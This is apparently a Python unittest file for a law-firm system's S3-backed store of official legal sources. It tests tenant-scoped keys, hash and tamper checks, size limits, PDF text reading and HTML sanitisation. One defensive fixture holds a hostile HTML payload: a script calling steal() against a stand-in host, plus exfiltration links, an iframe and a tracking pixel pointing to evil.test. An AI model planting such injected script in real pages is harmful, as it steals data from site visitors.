from __future__ import annotations

from copy import deepcopy
from datetime import datetime, timezone
from hashlib import sha256
from io import BytesIO
from types import SimpleNamespace
import unittest
from unittest.mock import patch
from uuid import uuid4

from pypdf import PdfWriter
from reportlab.pdfgen import canvas

from case_kernel.official_source_private_store import (
    ContextBoundOfficialSourceReader,
    OfficialSourceObjectStoreBlocked,
    OfficialSourceTextReadBudget,
    S3BackedPostgresOfficialSourceCaptureStore,
    S3OfficialSourceCaptureArtifactStore,
    S3BackedPostgresLegalSourceStore,
    S3OfficialSourcePrivateObjectStore,
    S3VerifiedOfficialSourceTextPort,
    compose_official_source_s3_adapters,
)
from case_kernel.legal_source_postgres import PostgresLegalSourceStore
from case_kernel.web_object_store import S3PrivateObjectStoreConfig


class _S3:
    def __init__(self) -> None:
        self.values: dict[tuple[str, str], dict] = {}
        self.last_put: dict | None = None
        self.change_after_get = False
        self.replace_body_on_get: bytes | None = None
        self.omit_checksum_on_head = False
        self.fail_next_head = False

    def put_object(self, **kwargs):
        request = dict(kwargs)
        body = request.pop("Body")
        content = body.read() if callable(getattr(body, "read", None)) else bytes(body)
        self.last_put = deepcopy(request)
        self.values[(kwargs["Bucket"], kwargs["Key"])] = {
            **request,
            "VersionId": "version-1",
            "ETag": '"immutable-etag"',
            "LastModified": datetime(2026, 9, 4, tzinfo=timezone.utc),
            "content": content,
        }
        return {"VersionId": "version-1"}

    def head_object(self, **kwargs):
        if self.fail_next_head:
            self.fail_next_head = False
            raise RuntimeError("transient head failure")
        value = self.values[(kwargs["Bucket"], kwargs["Key"])]
        result = {key: deepcopy(item) for key, item in value.items() if key != "content"}
        if self.omit_checksum_on_head:
            result.pop("ChecksumSHA256", None)
        return result

    def get_object(self, **kwargs):
        value = self.values[(kwargs["Bucket"], kwargs["Key"])]
        content = (
            self.replace_body_on_get
            if self.replace_body_on_get is not None
            else value["content"]
        )
        if self.change_after_get:
            value["ETag"] = '"changed-etag"'
        return {"Body": BytesIO(content)}

    def delete_object(self, **kwargs):
        raise AssertionError("official source objects are never deleted here")


class _ExactObjectMissing(Exception):
    def __init__(self) -> None:
        super().__init__("missing exact object")
        self.response = {"Error": {"Code": "404"}}


class _MissingS3:
    def put_object(self, **kwargs):
        del kwargs
        raise AssertionError("find-existing must not write")

    def head_object(self, **kwargs):
        del kwargs
        raise _ExactObjectMissing()

    def get_object(self, **kwargs):
        del kwargs
        raise AssertionError("missing object must not be read")


def _config() -> S3PrivateObjectStoreConfig:
    return S3PrivateObjectStoreConfig(
        endpoint_url="https://objects.example.test",
        region_name="cn-test-1",
        bucket="lawcase-private",
        access_key_id="access-key",
        secret_access_key="secret-key-at-least-sixteen",
    )


def _readable_pdf(text: str) -> bytes:
    output = BytesIO()
    document = canvas.Canvas(output, pagesize=(595, 842), pageCompression=0)
    document.drawString(72, 760, text)
    document.save()
    return output.getvalue()


def _blank_pdf() -> bytes:
    output = BytesIO()
    writer = PdfWriter()
    writer.add_blank_page(width=595, height=842)
    writer.write(output)
    return output.getvalue()


class OfficialSourcePrivateStoreTests(unittest.TestCase):
    def setUp(self) -> None:
        self.client = _S3()
        self.store = S3OfficialSourcePrivateObjectStore(
            _config(), client=self.client
        )
        self.firm = str(uuid4())
        self.matter = str(uuid4())
        self.snapshot = str(uuid4())

    def _put(self, body: bytes, media_type: str):
        digest = sha256(body).hexdigest()
        return self.store.put_official_source(
            body,
            firm_id=self.firm,
            matter_id=self.matter,
            content_sha256=digest,
            content_media_type=media_type,
        )

    def _text_port(
        self, *, max_source_bytes=32 * 1024 * 1024, max_characters=2_000_000
    ) -> S3VerifiedOfficialSourceTextPort:
        return S3VerifiedOfficialSourceTextPort(
            objects=self.store,
            budget=OfficialSourceTextReadBudget(
                max_source_bytes=max_source_bytes,
                max_text_characters=max_characters,
                max_pdf_pages=100,
            ),
        )

    def test_full_key_is_tenant_bound_while_ledger_gets_only_content_address(self):
        body = b"official source text"
        receipt = self._put(body, "text/plain; charset=utf-8")
        digest = sha256(body).hexdigest()

        self.assertEqual(
            receipt.ledger_object_key,
            f"{digest[:2]}/{digest[2:4]}/{digest}.lca",
        )
        self.assertNotIn(self.firm, receipt.ledger_object_key)
        self.assertNotIn(self.matter, receipt.ledger_object_key)
        self.assertEqual(
            self.client.last_put["Key"],
            (
                f"official-sources/v1/{self.firm}/{self.matter}/"
                f"{digest[:2]}/{digest[2:4]}/{digest}.lca"
            ),
        )
        self.assertEqual(self.client.last_put["IfNoneMatch"], "*")
        self.assertEqual(self.client.last_put["ServerSideEncryption"], "AES256")
        reader = self.store.bound_reader(firm_id=self.firm, matter_id=self.matter)
        self.assertEqual(reader(receipt.ledger_object_key, digest), body)
        self.assertEqual(
            reader.read_bytes(receipt.ledger_object_key, expected_sha256=digest), body
        )

    def test_checksumless_head_requires_stable_full_body_reconciliation(self):
        self.client.omit_checksum_on_head = True
        body = b"official source without a head checksum"
        receipt = self._put(body, "text/plain")

        recovered = self.store.recover_official_source(
            firm_id=self.firm,
            matter_id=self.matter,
            content_sha256=receipt.content_sha256,
            content_media_type="text/plain",
            byte_size=len(body),
        )
        self.assertEqual(recovered, receipt)
        reader = self.store.bound_reader(firm_id=self.firm, matter_id=self.matter)
        self.assertEqual(reader(receipt.ledger_object_key, receipt.content_sha256), body)
        self.assertEqual(receipt.stored_at, datetime(2026, 9, 4, tzinfo=timezone.utc))

    def test_find_existing_returns_none_only_for_exact_s3_not_found(self):
        missing = S3OfficialSourcePrivateObjectStore(_config(), client=_MissingS3())
        self.assertIsNone(
            missing.find_existing_official_source(
                firm_id=self.firm,
                matter_id=self.matter,
                content_sha256=sha256(b"missing").hexdigest(),
                content_media_type="text/plain",
                byte_size=len(b"missing"),
            )
        )

    def test_checksumless_head_never_bypasses_full_body_hash_validation(self):
        self.client.omit_checksum_on_head = True
        self.client.replace_body_on_get = b"tampered official source"
        with self.assertRaisesRegex(
            OfficialSourceObjectStoreBlocked, "immutable receipt"
        ):
            self._put(b"official source", "text/plain")

    def test_same_ledger_locator_cannot_cross_firm_or_matter(self):
        body = b"matter scoped official text"
        receipt = self._put(body, "text/plain")
        digest = sha256(body).hexdigest()

        for firm_id, matter_id in (
            (str(uuid4()), self.matter),
            (self.firm, str(uuid4())),
        ):
            with self.subTest(firm_id=firm_id, matter_id=matter_id):
                reader = self.store.bound_reader(
                    firm_id=firm_id, matter_id=matter_id
                )
                with self.assertRaisesRegex(
                    OfficialSourceObjectStoreBlocked, "could not be authenticated"
                ):
                    reader(receipt.ledger_object_key, digest)

    def test_wrong_hash_or_wrong_media_type_is_blocked_before_text_use(self):
        body = b"verified source"
        receipt = self._put(body, "text/plain")
        digest = sha256(body).hexdigest()
        wrong = sha256(b"different").hexdigest()

        with self.assertRaisesRegex(
            OfficialSourceObjectStoreBlocked, "locator differs"
        ):
            self.store.read_official_source(
                firm_id=self.firm,
                matter_id=self.matter,
                ledger_object_key=receipt.ledger_object_key,
                expected_sha256=wrong,
            )
        with self.assertRaisesRegex(
            OfficialSourceObjectStoreBlocked, "media type differs"
        ):
            self.store.read_official_source(
                firm_id=self.firm,
                matter_id=self.matter,
                ledger_object_key=receipt.ledger_object_key,
                expected_sha256=digest,
                expected_media_type="text/html",
            )

    def test_object_body_or_metadata_change_is_detected(self):
        body = b"immutable official text"
        receipt = self._put(body, "text/plain")
        digest = sha256(body).hexdigest()
        self.client.replace_body_on_get = b"tampered official text!"
        with self.assertRaisesRegex(
            OfficialSourceObjectStoreBlocked, "immutable receipt"
        ):
            self.store.read_official_source(
                firm_id=self.firm,
                matter_id=self.matter,
                ledger_object_key=receipt.ledger_object_key,
                expected_sha256=digest,
                expected_media_type="text/plain",
            )

        self.client.replace_body_on_get = None
        self.client.change_after_get = True
        with self.assertRaisesRegex(OfficialSourceObjectStoreBlocked, "changed"):
            self.store.read_official_source(
                firm_id=self.firm,
                matter_id=self.matter,
                ledger_object_key=receipt.ledger_object_key,
                expected_sha256=digest,
                expected_media_type="text/plain",
            )

    def test_malicious_html_is_literal_visible_text_only_and_locator_is_a_label(self):
        body = (
            b"<!doctype html><html><head>"
            b"<script>steal('https://evil.test')</script>"
            b"<style>body{display:none}</style></head><body>"
            b"<h1>Official title</h1>"
            b"<a href='https://evil.test/collect'>Reviewed provision text</a>"
            b"<iframe src='https://evil.test/frame'>frame secret</iframe>"
            b"<img src='https://evil.test/pixel'></body></html>"
        )
        receipt = self._put(body, "text/html")
        result = self._text_port().read_verified_source_text(
            firm_id=self.firm,
            matter_id=self.matter,
            snapshot_id=self.snapshot,
            storage_object_key=receipt.ledger_object_key,
            content_sha256=receipt.content_sha256,
            content_media_type="text/html; charset=UTF-8",
            provision_locator="第六百八十条（律师核验标签）",
        )

        self.assertIn("系统未自动定位到精确条款", result)
        self.assertIn("第六百八十条（律师核验标签）", result)
        self.assertIn("Official title", result)
        self.assertIn("Reviewed provision text", result)
        self.assertNotIn("evil.test", result)
        self.assertNotIn("steal", result)
        self.assertNotIn("frame secret", result)

    def test_html_shell_with_markers_only_in_script_is_not_document_text(self):
        body = (
            b"<!doctype html><html><head><script>"
            b"const source='\xe4\xb8\xad\xe5\x8d\x8e\xe4\xba\xba\xe6\xb0\x91\xe5\x85\xb1\xe5\x92\x8c\xe5\x9b\xbd\xe6\xb0\x91\xe6\xb3\x95\xe5\x85\xb8';"
            b"</script></head><body><div id='application'></div></body></html>"
        )
        receipt = self._put(body, "text/html")
        with self.assertRaisesRegex(
            OfficialSourceObjectStoreBlocked, "no readable text"
        ):
            self._text_port().read_verified_source_text(
                firm_id=self.firm,
                matter_id=self.matter,
                snapshot_id=self.snapshot,
                storage_object_key=receipt.ledger_object_key,
                content_sha256=receipt.content_sha256,
                content_media_type="text/html",
                provision_locator="第六百八十条",
            )

    def test_text_character_limit_is_fail_closed(self):
        body = b"<!doctype html><html><body>one two three four five</body></html>"
        receipt = self._put(body, "text/html")
        with self.assertRaisesRegex(
            OfficialSourceObjectStoreBlocked, "character limit"
        ):
            self._text_port(max_characters=5).read_verified_source_text(
                firm_id=self.firm,
                matter_id=self.matter,
                snapshot_id=self.snapshot,
                storage_object_key=receipt.ledger_object_key,
                content_sha256=receipt.content_sha256,
                content_media_type="text/html",
                provision_locator="全文",
            )

    def test_source_byte_limit_is_fail_closed_before_remote_write(self):
        limited_client = _S3()
        limited = S3OfficialSourcePrivateObjectStore(
            _config(), client=limited_client, max_source_bytes=8
        )
        body = b"123456789"
        with self.assertRaisesRegex(
            OfficialSourceObjectStoreBlocked, "configured limit"
        ):
            limited.put_official_source(
                body,
                firm_id=self.firm,
                matter_id=self.matter,
                content_sha256=sha256(body).hexdigest(),
                content_media_type="text/plain",
            )
        self.assertIsNone(limited_client.last_put)

    def test_scanned_or_textless_pdf_page_is_blocked(self):
        body = _blank_pdf()
        receipt = self._put(body, "application/pdf")
        with self.assertRaisesRegex(
            OfficialSourceObjectStoreBlocked, "no authenticated text layer"
        ):
            self._text_port().read_verified_source_text(
                firm_id=self.firm,
                matter_id=self.matter,
                snapshot_id=self.snapshot,
                storage_object_key=receipt.ledger_object_key,
                content_sha256=receipt.content_sha256,
                content_media_type="application/pdf",
                provision_locator="第1页",
            )

    def test_pdf_existing_text_layer_is_read_without_render_or_ocr(self):
        body = _readable_pdf("Verified official provision")
        receipt = self._put(body, "application/pdf")
        result = self._text_port().read_verified_source_text(
            firm_id=self.firm,
            matter_id=self.matter,
            snapshot_id=self.snapshot,
            storage_object_key=receipt.ledger_object_key,
            content_sha256=receipt.content_sha256,
            content_media_type="application/pdf",
            provision_locator="PDF第1页",
        )
        self.assertIn("[PDF第1页]", result)
        self.assertIn("Verified official provision", result)

    def test_context_reader_fails_without_scope_and_is_compatible_when_bound(self):
        body = b"legal store source"
        receipt = self._put(body, "text/plain")
        reader = ContextBoundOfficialSourceReader(self.store)
        with self.assertRaisesRegex(
            OfficialSourceObjectStoreBlocked, "no authorized matter scope"
        ):
            reader(receipt.ledger_object_key, receipt.content_sha256)
        with reader.bind(firm_id=self.firm, matter_id=self.matter):
            self.assertEqual(
                reader(receipt.ledger_object_key, receipt.content_sha256), body
            )
        with self.assertRaisesRegex(
            OfficialSourceObjectStoreBlocked, "no authorized matter scope"
        ):
            reader(receipt.ledger_object_key, receipt.content_sha256)

    def test_production_factory_exposes_concrete_worker_and_ledger_adapters(self):
        adapters = compose_official_source_s3_adapters(
            _config(), client=self.client
        )
        self.assertIsInstance(adapters.verified_text, S3VerifiedOfficialSourceTextPort)
        self.assertIsInstance(
            adapters.legal_source_store(dsn="postgresql://db/lawcase"),
            S3BackedPostgresLegalSourceStore,
        )
        capture_reader = adapters.capture_reader(
            firm_id=self.firm, matter_id=self.matter
        )
        self.assertTrue(callable(capture_reader))
        self.assertTrue(callable(capture_reader.read_bytes))
        self.assertIsInstance(
            adapters.capture_store(dsn="postgresql://db/lawcase"),
            S3BackedPostgresOfficialSourceCaptureStore,
        )
        self.assertIsInstance(
            adapters.capture_artifact_store(firm_id=self.firm, matter_id=self.matter),
            S3OfficialSourceCaptureArtifactStore,
        )

    def test_capture_artifact_store_writes_and_reads_only_its_bound_matter(self):
        body = b"authorized official source"
        digest = sha256(body).hexdigest()
        capture_store = compose_official_source_s3_adapters(
            _config(), client=self.client
        ).capture_artifact_store(firm_id=self.firm, matter_id=self.matter)

        receipt = capture_store.put_captured_official_source(
            body,
            expected_sha256=digest,
            case_root="/ignored-by-s3",
            content_media_type="text/plain; charset=utf-8",
        )

        self.assertEqual(receipt.plaintext_sha256, digest)
        self.assertEqual(receipt.plaintext_bytes, len(body))
        self.assertEqual(
            receipt.object_key, f"{digest[:2]}/{digest[2:4]}/{digest}.lca"
        )
        self.assertEqual(
            capture_store.read_bytes(receipt.object_key, expected_sha256=digest), body
        )
        wrong_scope = compose_official_source_s3_adapters(
            _config(), client=self.client
        ).capture_artifact_store(firm_id=self.firm, matter_id=str(uuid4()))
        with self.assertRaisesRegex(OfficialSourceObjectStoreBlocked, "could not be authenticated"):
            wrong_scope.read_bytes(receipt.object_key, expected_sha256=digest)

    def test_capture_artifact_store_recovers_an_immutable_write_after_an_indeterminate_head(self):
        body = b"reconcile official source"
        digest = sha256(body).hexdigest()
        capture_store = compose_official_source_s3_adapters(
            _config(), client=self.client
        ).capture_artifact_store(firm_id=self.firm, matter_id=self.matter)
        self.client.fail_next_head = True

        receipt = capture_store.put_captured_official_source(
            body,
            expected_sha256=digest,
            case_root="/ignored-by-s3",
            content_media_type="text/plain",
        )

        self.assertEqual(receipt.plaintext_sha256, digest)
        self.assertEqual(
            capture_store.read_bytes(receipt.object_key, expected_sha256=digest), body
        )

    def test_s3_backed_legal_store_binds_current_command_scope_then_clears_it(self):
        body = b"command scoped legal source"
        receipt = self._put(body, "text/plain")
        legal = S3BackedPostgresLegalSourceStore(
            "postgresql://db/lawcase", objects=self.store
        )

        def inherited(service, **_kwargs):
            return service._official_source_reader(
                receipt.ledger_object_key, receipt.content_sha256
            )

        with patch.object(
            PostgresLegalSourceStore,
            "register_official_source_snapshot",
            new=inherited,
        ):
            result = legal.register_official_source_snapshot(
                matter_id=self.matter,
                actor=SimpleNamespace(firm_id=self.firm),
            )
        self.assertEqual(result, body)
        with self.assertRaisesRegex(
            OfficialSourceObjectStoreBlocked, "no authorized matter scope"
        ):
            legal._official_source_reader(
                receipt.ledger_object_key, receipt.content_sha256
            )


if __name__ == "__main__":
    unittest.main()
